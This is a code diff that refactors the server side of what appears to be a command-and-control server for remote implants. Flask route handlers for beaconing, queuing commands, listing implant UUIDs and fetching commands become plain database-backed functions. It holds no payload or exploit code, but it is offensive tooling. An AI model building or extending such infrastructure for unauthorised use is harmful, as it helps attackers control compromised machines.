@@ -1,26 +1,12 @@
-from flask import Blueprint, request, jsonify
+from app.database import db
+from app.database.models import CommandQueue
 
 import logging
 
-from app import db
-from app.models import CommandQueue
-
 logging.basicConfig(level=logging.DEBUG)
 
-bp = Blueprint("api", __name__, url_prefix="/api/v1")
 
-
-@bp.route("/beacon", methods=["POST"])
-def beacon():
-    data = request.get_json()
-    timestamp = data.get("timestamp")
-    implant_uuid = data.get("uuid")
-    system_info = data
-
-    logging.info(
-        f"Received beacon from {implant_uuid} at {timestamp} seconds: {system_info}"
-    )
-
+def process_beacon(implant_uuid):
     command_queue = CommandQueue.query.filter_by(implant_uuid=implant_uuid).first()
     if not command_queue:
         command_queue = CommandQueue(implant_uuid=implant_uuid, commands=[])
@@ -46,21 +32,13 @@ def beacon():
         logging.debug(f"No commands for {implant_uuid}.")
         command_response = {"command": ""}
 
-    return jsonify(command_response)
+    return command_response
 
 
-@bp.route("/command", methods=["POST"])
-def command():
-    data = request.get_json()
-    command_text = data.get("command")
-    implant_uuid = data.get("uuid")
-
-    if not command_text or not implant_uuid:
-        return jsonify({"status": "Invalid command or UUID"}), 400
-
+def add_command_to_queue(implant_uuid, command_text):
     command_queue = CommandQueue.query.filter_by(implant_uuid=implant_uuid).first()
     if not command_queue:
-        return jsonify({"message": "Given UUID is not in use."}), 404
+        return False
 
     logging.info(
         f"Before adding: Current commands for {implant_uuid}: {command_queue.commands}"
@@ -82,18 +60,16 @@ def command():
         f"After adding: New commands for {implant_uuid}: {command_queue.commands}"
     )
 
-    return jsonify({"message": "Command added to queue successfully"}), 200
+    return True
 
 
-@bp.route("/uuids", methods=["GET"])
-def list_uuids():
+def list_all_uuids():
     uuids = db.session.query(CommandQueue.implant_uuid).distinct().all()
-    return jsonify([uuid[0] for uuid in uuids])
+    return [uuid[0] for uuid in uuids]
 
 
-@bp.route("/commands/<uuid>", methods=["GET"])
-def get_commands(uuid):
-    command_queue = CommandQueue.query.filter_by(implant_uuid=uuid).first()
+def get_commands_for_uuid(implant_uuid):
+    command_queue = CommandQueue.query.filter_by(implant_uuid=implant_uuid).first()
     if not command_queue:
-        return jsonify({"message": "No commands found"}), 404
-    return jsonify(command_queue.commands)
+        return None
+    return command_queue.commands
